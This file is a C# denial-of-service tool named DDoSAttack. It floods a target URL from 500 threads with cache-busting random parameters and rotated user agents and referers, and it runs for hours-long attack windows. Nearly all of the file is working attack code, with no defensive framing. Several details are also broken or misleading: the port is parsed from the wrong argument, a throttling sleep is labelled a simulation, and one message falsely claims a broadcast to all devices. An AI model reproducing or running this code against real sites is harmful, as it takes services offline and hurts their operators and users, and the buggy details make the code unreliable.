using System;
using System.Collections.Generic;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

namespace DDoSAttack
{
    class Program
    {
        // Global params
        static string url = "";
        static string host = "";
        static int port = 80;  // Default port
        static List<string> headersUserAgents = new List<string>();
        static List<string> headersReferers = new List<string>();
        static int requestCounter = 0;
        static int flag = 0;
        static int safe = 0;
        static double attackDuration = 1;  // Set the attack duration in hours
        static double pauseDuration = 2;   // Set the pause duration in hours
        static int responseDelay = 5;   // Set the response delay in seconds
        static object lockObject = new object();  // Used for thread synchronization

        static void IncCounter()
        {
            lock (lockObject)
            {
                requestCounter++;
            }
        }

        static void SetFlag(int val)
        {
            lock (lockObject)
            {
                flag = val;
            }
        }

        static void SetSafe()
        {
            lock (lockObject)
            {
                safe = 1;
            }
        }

        // Generates a user agent list
        static void UserAgentList()
        {
            headersUserAgents.Add("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3");
            // ... (remaining user agents)
        }

        // Generates a referer list
        static void RefererList()
        {
            headersReferers.Add("http://www.google.com/?q=");
            // ... (remaining referers)
        }

        // Builds random ASCII string
        static string BuildBlock(int size)
        {
            Random random = new Random();
            string outStr = "";
            for (int i = 0; i < size; i++)
            {
                int a = random.Next(65, 91);
                outStr += (char)a;
            }
            return outStr;
        }

        static void Usage()
        {
            Console.WriteLine("---------------------------------------------------");
            Console.WriteLine("USAGE: DDoSAttack.exe <url> [port] [attack_duration]");
            Console.WriteLine("you can add 'safe' after url, to autoshut after dos");
            Console.WriteLine("---------------------------------------------------");
        }

        // HTTP request
        static int HttpCall(string url)
        {
            UserAgentList();
            RefererList();
            int code = 0;
            string paramJoiner = url.Contains("?") ? "&" : "?";
            string randomParam = BuildBlock(new Random().Next(3, 10)) + '=' + BuildBlock(new Random().Next(3, 10));
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + paramJoiner + randomParam);
            request.UserAgent = headersUserAgents[new Random().Next(headersUserAgents.Count)];
            request.Headers.Add("Cache-Control", "no-cache");
            request.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
            request.Headers.Add("Referer", headersReferers[new Random().Next(headersReferers.Count)] + BuildBlock(new Random().Next(5, 10)));
            request.Headers.Add("Keep-Alive", new Random().Next(110, 120).ToString());
            request.Headers.Add("Connection", "keep-alive");
            request.Headers.Add("Host", host);
            try
            {
                Thread.Sleep(responseDelay * 1000);  // Simulate a delay in response time
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    IncCounter();
                }
            }
            catch (WebException ex)
            {
                HttpWebResponse errorResponse = (HttpWebResponse)ex.Response;
                if (errorResponse != null)
                {
                    SetFlag(1);
                    Console.WriteLine($"Response Code {errorResponse.StatusCode}");
                    code = 500;
                }
            }
            return code;
        }

        // HTTP caller thread
        class HTTPThread
        {
            public void Run()
            {
                try
                {
                    double startTime = DateTime.Now.TimeOfDay.TotalSeconds;  // Record the start time
                    while (flag < 2 && (DateTime.Now.TimeOfDay.TotalSeconds - startTime) < (attackDuration * 3600))
                    {
                        int code = HttpCall(url);
                        if (code == 500 && safe == 1)
                        {
                            SetFlag(2);
                        }
                    }
                    Console.WriteLine("\n-- Attack has been broadcasted to all devices... --");  // Change this line
                    Console.WriteLine("\n-- DDoS Attack Paused --");
                    Thread.Sleep((int)(pauseDuration * 3600 * 1000));  // Pause for the specified duration
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

        // Monitors HTTP threads and counts requests
        class MonitorThread
        {
            public void Run()
            {
                int previous = requestCounter;
                while (flag == 0)
                {
                    if (previous + 100 < requestCounter && previous != requestCounter)
                    {
                        Console.WriteLine($"{requestCounter} Requests Sent");
                        previous = requestCounter;
                    }
                }
                if (flag == 2)
                {
                    Console.WriteLine("\n-- DDoS Attack Finished --");
                }
            }
        }

        // Execute
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Usage();
                Environment.Exit(0);
            }
            else
            {
                if (args[0] == "help")
                {
                    Usage();
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine("-- DDoS Attack Started --");
                    if (args.Length >= 3)
                    {
                        port = int.Parse(args[2]);
                    }
                    if (args.Length >= 4)
                    {
                        attackDuration = double.Parse(args[3]);
                    }
                    if (args.Length >= 5)
                    {
                        if (args[4] == "safe")
                        {
                            SetSafe();
                        }
                    }
                    url = args[0];
                    Console.WriteLine($"Target URL: {url}, Port: {port}, Attack Duration: {attackDuration} hours");  // Add this line for debugging
                    if (url.Contains("/"))
                    {
                        url = url + "/";
                    }
                    string pattern = @"http://([^/:]*)[:/]?.*";
                    Match match = Regex.Match(url, pattern);
                    if (match.Success)
                    {
                        host = match.Groups[1].Value;
                    }
                    else
                    {
                        Console.WriteLine("Error: Unable to extract host from URL.");
                        Environment.Exit(0);
                    }
                    for (int i = 0; i < 500; i++)
                    {
                        Thread t = new Thread(new HTTPThread().Run);
                        t.Start();
                    }
                    Thread monitorThread = new Thread(new MonitorThread().Run);
                    monitorThread.Start();
                    
                    // Keep the application running
                    Thread.Sleep(Timeout.Infinite);
                }
            }
        }
    }
}
